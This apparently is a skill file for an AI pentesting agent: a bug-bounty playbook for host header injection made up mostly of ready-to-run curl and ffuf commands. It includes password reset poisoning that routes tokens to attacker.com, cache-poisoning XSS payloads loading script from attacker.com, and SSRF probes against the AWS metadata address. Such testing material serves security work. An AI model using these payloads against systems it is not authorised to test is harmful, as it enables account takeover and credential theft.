<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: host-header-injection
description: Host header injection — password reset poisoning, cache poisoning via Host header, SSRF via Host, routing bypass, and web cache deception using manipulated Host headers
---

# Host Header Injection

Host header injection = manipulating the HTTP `Host` header to poison password resets, bypass routing, perform SSRF, or poison caches. One of the most common high-severity bug bounty findings.

---

## Detection — Testing Host Header Manipulation

    # Basic test — replace Host header:
    curl -H "Host: attacker.com" http://target.com/
    # If response references attacker.com → vulnerable

    # Add X-Forwarded-Host:
    curl -H "Host: target.com" -H "X-Forwarded-Host: attacker.com" http://target.com/
    curl -H "X-Forwarded-Host: attacker.com" http://target.com/

    # Add X-Host:
    curl -H "X-Host: attacker.com" http://target.com/

    # Duplicate Host header:
    curl -H "Host: target.com" -H "Host: attacker.com" http://target.com/
    # First or last header wins depending on server

    # Absolute URL bypass:
    GET http://attacker.com/ HTTP/1.1
    Host: target.com

    # Port confusion:
    curl -H "Host: target.com:@attacker.com" http://target.com/
    curl -H "Host: target.com: attacker.com" http://target.com/

---

## Password Reset Poisoning

**Highest-impact** use case: if password reset email contains `Host` header value in reset URL:

    # Test: request password reset while injecting Host:
    curl -X POST http://target.com/forgot-password \
      -H "Host: attacker.com" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -d "email=victim@target.com"

    # If email contains: "Click here to reset: https://attacker.com/reset?token=xxx"
    # → attacker receives the reset token → account takeover

    # Try with X-Forwarded-Host (often trusted more):
    curl -X POST http://target.com/forgot-password \
      -H "Host: target.com" \
      -H "X-Forwarded-Host: attacker.com" \
      -d "email=victim@target.com"

    # Confirm with interactsh (OOB detection):
    # interactsh-client -v → get unique URL
    # Replace attacker.com with your interactsh domain:
    curl -X POST http://target.com/forgot-password \
      -H "X-Forwarded-Host: <unique>.oast.fun" \
      -d "email=test@target.com"
    # If DNS/HTTP hit received → vulnerable

---

## Web Cache Poisoning via Host Header

Cache stores response keyed to URL only (not Host) → serve poisoned response to all users:

    # Inject Host header that adds malicious content to response:
    curl -H "Host: target.com" -H "X-Forwarded-Host: \" onmouseover=\"alert(1)" \
      http://target.com/

    # If server reflects Host in response (e.g., in canonical URL, meta refresh):
    # <link rel="canonical" href="//attacker.com/page"/>
    # This cached response → XSS for all users loading the cached page

    # Check if response is cached:
    curl -v http://target.com/ | grep -i "cache\|x-cache\|age\|cf-cache"
    # X-Cache: HIT = cached
    # Age: N = N seconds old cache

---

## SSRF via Host Header

    # If application makes backend requests using Host header value:
    curl -H "Host: 169.254.169.254" http://target.com/
    curl -H "Host: localhost" http://target.com/
    curl -H "Host: internal-service.corp" http://target.com/

    # AWS metadata via Host header SSRF:
    curl -H "Host: 169.254.169.254" http://target.com/latest/meta-data/

    # Check response: if internal content returned → SSRF via Host header

---

## Routing Bypass (Virtual Host Switching)

    # Try accessing admin vhost via Host header on same IP:
    curl -H "Host: admin.internal" http://<target_ip>/
    curl -H "Host: localhost" http://<target_ip>/
    curl -H "Host: 127.0.0.1" http://<target_ip>/

    # Find internal vhosts:
    ffuf -u http://<target_ip>/ -H "Host: FUZZ.target.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <default_size>
    ffuf -u http://<target_ip>/ -H "Host: FUZZ" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

---

## Ambiguous Host Header (Request Smuggling Connection)

    # Duplicate headers to confuse front-end vs back-end:
    POST / HTTP/1.1
    Host: target.com
    Host: attacker.com

    # Combined with HTTP request smuggling (see http_smuggling.md)

---

## Headers to Test (Beyond Host)

    X-Forwarded-Host: attacker.com
    X-Host: attacker.com
    X-Original-Host: attacker.com
    X-Forwarded-Server: attacker.com
    X-HTTP-Host-Override: attacker.com
    Forwarded: host=attacker.com

    # Test each header:
    for header in "X-Forwarded-Host" "X-Host" "X-Original-Host" "X-Forwarded-Server" "X-HTTP-Host-Override"; do
        echo "Testing $header:";
        curl -s -H "$header: attacker.com" http://target.com/ | grep -i "attacker";
    done

---

## Automated Testing

    # nuclei:
    nuclei -t http/vulnerabilities/generic/host-header-injection.yaml -u http://target.com/

    # headi (host header injection scanner):
    # go install github.com/mlcsec/headi@latest
    headi -u http://target.com/

    # Manual ffuf for vhost discovery:
    ffuf -u http://target.com/ -H "Host: FUZZ.target.com" -w subdomains.txt -mc 200 -fs <normal_size>

---

## Pro Tips

1. Password reset + Host injection = **account takeover** — highest impact finding, test on every password reset endpoint
2. Always test `X-Forwarded-Host` — many apps trust this over `Host` for "flexibility"
3. Use interactsh for blind detection — sends OOB DNS/HTTP ping that confirms injection without reflection
4. Cache poisoning requires the poisoned content to actually be cached — check `X-Cache: HIT`
5. Combined with XSS: inject `"><script src=//attacker.com/xss.js>` as Host → cached XSS for all users
6. vHost brute force via ffuf finds hidden admin panels and staging environments

## Summary

Host header injection testing: Replace `Host: target.com` with `X-Forwarded-Host: attacker.com` → trigger password reset → check email for attacker domain in link. Also test for SSRF (`Host: 169.254.169.254`), vhost switching, and cache poisoning. Use interactsh for OOB blind detection. Password reset poisoning = ATO with no victim interaction.
